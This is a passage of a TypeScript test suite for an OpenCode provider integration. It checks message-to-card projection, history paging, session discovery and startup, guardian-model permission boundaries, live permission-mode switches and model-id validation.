          { type: 'tool', id: 'call_1', name: 'read', state: {
            status: 'completed', input: { filePath: '/workspace/a/a.ts' }, content: [{ text: 'ok' }],
          } },
          { type: 'text', id: 'text_1', text: 'Done.' },
        ],
      },
    ]);
    expect(cards.map((card) => card.type)).toEqual(['user', 'thinking', 'tool_call', 'assistant_text']);
    expect(cards[0]?.turnId).toBe('msg_user');
    expect(cards[2]?.toolName).toBe('Read');
    expect(cards[3]?.text).toBe('Done.');
  });

  it('does not project the synthetic overflow continuation as a user message', () => {
    const cards = projectOpenCodeMessages('ses_history', '/workspace/a', [
      {
        id: 'msg_recovery',
        type: 'user',
        text: '[Quicksave automatic continuation] Continue from where you left off after the automatic context compaction.',
      },
      { id: 'msg_assistant', type: 'assistant', content: [{ type: 'text', text: 'Recovered.' }] },
    ]);
    expect(cards.map((card) => card.type)).toEqual(['assistant_text']);
    expect(cards[0]?.text).toBe('Recovered.');
  });

  it('uses the OpenCode v2 cursor directly for older card pages', async () => {
    const server = makeMockServer();
    const page = vi.fn().mockResolvedValue({
      items: [{ id: 'msg_old', type: 'user', text: 'older prompt' }],
      cursor: { next: 'native-next' },
    });
    (server as any).getMessagePage = page;
    const result = await new OpenCodeProvider(server).loadCardHistory({
      sessionId: 'ses_history', cwd: '/workspace/a', offset: 1, limit: 50, cursor: 'opencode-v2:native-current',
    });
    expect(page).toHaveBeenCalledWith('ses_history', {
      limit: 50, cursor: 'native-current', directory: '/workspace/a',
    });
    expect(result.cards.map((card) => card.type)).toEqual(['user']);
    expect(result.hasMore).toBe(true);
    expect(result.nextCursor).toBe('opencode-v2:native-next');
  });

  it('omits OpenCode delegated-agent child sessions from native task discovery', async () => {
    const server = makeMockServer();
    (server as any).listSessions = vi.fn().mockResolvedValue([
      {
        id: 'ses_parent',
        directory: '/workspace/a',
        title: 'Parent task',
        time: { created: 100, updated: 200, archived: null },
      },
      {
        id: 'ses_child',
        parentID: 'ses_parent',
        directory: '/workspace/a',
        title: 'Delegated task',
        time: { created: 110, updated: 190, archived: null },
      },
    ]);

    const sessions = await new OpenCodeProvider(server).listNativeSessions({ cwd: '/workspace/a' });

    expect(sessions).toHaveLength(1);
    expect(sessions[0]).toMatchObject({ sessionId: 'ses_parent', agent: 'opencode' });
  });

  it('routes a new session to its directory and forwards attachments', async () => {
    const server = makeMockServer();
    const provider = new OpenCodeProvider(server);
    await provider.startSession(
      {
        prompt: 'inspect this',
        cwd: '/workspace/a',
        permissionLevel: 'auto',
        sandboxed: false,
        model: 'vllm/foo/bar',
        attachments: [{
          id: 'att_1',
          kind: 'image',
          mimeType: 'image/png',
          name: 'screen.png',
          size: 3,
          data: 'YWJj',
        }],
      },
      new StreamCardBuilder('pending', '/workspace/a'),
      makeCallbacks(),
    );
    await new Promise((r) => setImmediate(r));
    expect(server.creates).toEqual([{ directory: '/workspace/a', agent: 'build' }]);
    expect(server.prompts[0]).toMatchObject({
      sessionID: 'ses_mock',
      directory: '/workspace/a',
      body: {
        text: 'inspect this',
        model: { providerID: 'vllm', modelID: 'foo/bar' },
      },
    });
    expect(server.prompts[0]?.body.attachments).toHaveLength(1);
  });

  it('requires a guardian model server and applies the MCP approval boundary', async () => {
    const server = makeMockServer();
    const provider = new OpenCodeProvider(server);
    await expect(provider.startSession(
      {
        prompt: 'inspect this',
        cwd: '/workspace/a',
        permissionLevel: 'auto-review',
        sandboxed: false,
        model: 'vllm/foo/bar',
      },
      new StreamCardBuilder('pending', '/workspace/a'),
      makeCallbacks(),
    )).rejects.toThrow(/requires a guardian model server/);
    expect(server.creates).toHaveLength(0);

    process.env.QUICKSAVE_GUARDIAN_MODEL_SERVER_URL = 'http://localhost:8000/v1';
    process.env.QUICKSAVE_GUARDIAN_MODEL = 'reviewer-model';
    await provider.startSession(
      {
        prompt: 'inspect this',
        cwd: '/workspace/a',
        permissionLevel: 'auto-review',
        sandboxed: false,
        model: 'vllm/foo/bar',
      },
      new StreamCardBuilder('pending-2', '/workspace/a'),
      makeCallbacks(),
    );
    expect(server.creates[0]?.permission).toContainEqual(
      { permission: '*', pattern: '*', action: 'ask' },
    );
    expect(server.creates[0]?.permission).toEqual(expect.arrayContaining([
      { permission: 'mcp__quicksave-tools__UpdateSessionStatus', pattern: '*', action: 'allow' },
      { permission: 'mcp__quicksave-tools__DisplayMarkdownReport', pattern: '*', action: 'allow' },
      { permission: 'mcp__quicksave-tools__RegisterBackgroundExecutionCompletion', pattern: '*', action: 'allow' },
    ]));
  });

  it('enforces and clears the guardian boundary during a live permission switch', async () => {
    process.env.QUICKSAVE_GUARDIAN_MODEL_SERVER_URL = 'http://localhost:8000/v1';
    process.env.QUICKSAVE_GUARDIAN_MODEL = 'reviewer-model';
    const server = makeMockServer();
    const provider = new OpenCodeProvider(server);
    const { session } = await provider.startSession(
      {
        prompt: 'inspect this', cwd: '/workspace/a', permissionLevel: 'default',
        sandboxed: false, model: 'vllm/foo/bar',
      },
      new StreamCardBuilder('pending', '/workspace/a'),
      makeCallbacks(),
    );

    await session.setPermissionMode?.('auto-review');
    expect(server.permissionUpdates.at(-1)).toMatchObject({
      sessionID: 'ses_mock', directory: '/workspace/a',
      permission: expect.arrayContaining([{ permission: '*', pattern: '*', action: 'ask' }]),
    });

    await session.setPermissionMode?.('default');
    expect(server.permissionUpdates.at(-1)).toEqual({
      sessionID: 'ses_mock', directory: '/workspace/a', permission: [],
    });
  });

  it('rejects a live auto-review switch before changing server permissions when unconfigured', async () => {
    const server = makeMockServer();
    const provider = new OpenCodeProvider(server);
    const { session } = await provider.startSession(
      {
        prompt: 'inspect this', cwd: '/workspace/a', permissionLevel: 'default',
        sandboxed: false, model: 'vllm/foo/bar',
      },
      new StreamCardBuilder('pending', '/workspace/a'),
      makeCallbacks(),
    );
    await expect(session.setPermissionMode?.('auto-review')).rejects.toThrow(/configure it/i);
    expect(server.permissionUpdates).toHaveLength(0);
  });

  it('primes historical tool state before sending a cold-resume prompt', async () => {
    const server = makeMockServer();
    const provider = new OpenCodeProvider(server);
    server.messages.push({
      info: { id: 'msg_old', role: 'assistant' },
      parts: [{
        type: 'tool',
        tool: 'read',
        callID: 'call_old',
        state: { status: 'completed', input: { filePath: '/old' }, output: 'old' },
      }],
    });
    const getMessages = vi.spyOn(server, 'getMessages');

    await provider.resumeSession(
      {
        sessionId: 'ses_existing',
        prompt: 'continue',
        cwd: '/workspace/a',
        permissionLevel: 'auto',
        sandboxed: false,
        model: 'vllm/foo/bar',
      },
      new StreamCardBuilder('ses_existing', '/workspace/a'),
      makeCallbacks(),
    );

    expect(getMessages).toHaveBeenCalledWith('ses_existing', '/workspace/a');
    expect(server.prompts).toEqual([expect.objectContaining({
      sessionID: 'ses_existing',
      body: expect.objectContaining({ text: 'continue' }),
    })]);
  });

  it('startSession rejects invalid model ids without spawning anything', async () => {
    const provider = new OpenCodeProvider();
    await expect(provider.startSession(
      { prompt: 'x', cwd: '/p', permissionLevel: 'default', sandboxed: false, model: 'claude-opus-4-7' } as never,
      new StreamCardBuilder('p', '/p'),
      makeCallbacks(),
    )).rejects.toThrow(/invalid/);
  });

  it('startSession rejects missing model id', async () => {
    const provider = new OpenCodeProvider();
    await expect(provider.startSession(
      { prompt: 'x', cwd: '/p', permissionLevel: 'default', sandboxed: false } as never,
      new StreamCardBuilder('p', '/p'),
      makeCallbacks(),
    )).rejects.toThrow(/requires an explicit model/);
  });
});
